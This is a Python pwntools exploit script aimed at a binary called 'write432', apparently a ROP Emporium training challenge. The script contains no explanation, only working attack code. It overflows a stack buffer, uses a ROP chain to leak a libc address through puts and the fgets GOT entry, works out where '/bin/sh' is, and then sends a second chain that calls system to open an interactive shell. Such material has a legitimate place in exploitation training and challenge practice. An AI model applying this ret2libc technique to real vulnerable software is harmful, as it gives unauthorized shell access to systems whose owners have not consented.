from pwn import *

target = process('./write432')

elf=ELF('./write432')

libc=elf.libc

# used for debugging
# context.terminal=["tmux","split","-h"]
# gdb.attach(target)

print(target.recvuntil("> "))

payload = "A" * 44

puts_plt = 0x8048420
fgets_got = 0x804a010
system_plt = 0x8048430
pop = 0x080483e1
pwnme=0x080485f6

payload += p32(puts_plt)
payload += p32(pop)
payload += p32(fgets_got)

payload += p32(pwnme)
payload += p32(0x0)

target.sendline(payload)

leak = target.recv()

leak = leak[0:4]

#unpack the leak as a 32-bit address
libc_fgets=u32(leak+"\x00"*(4-len(leak)))

libc_base=libc_fgets-libc.symbols["fgets"]

libc_binsh=libc_base+libc.search("/bin/sh\x00").next()
#print the libc addresses
print("Address for fgets: " +hex(libc_fgets))
print("Address for libc_base: " +hex(libc_base))
print("Address for /bin/sh: " +hex(libc_binsh))

##second rop

payload = "A"*44

payload += p32(system_plt)
payload += p32(0xdeadbeef)
payload += p32(libc_binsh)
#send payload
target.sendline(payload)

#interact with the launched shell
target.interactive()
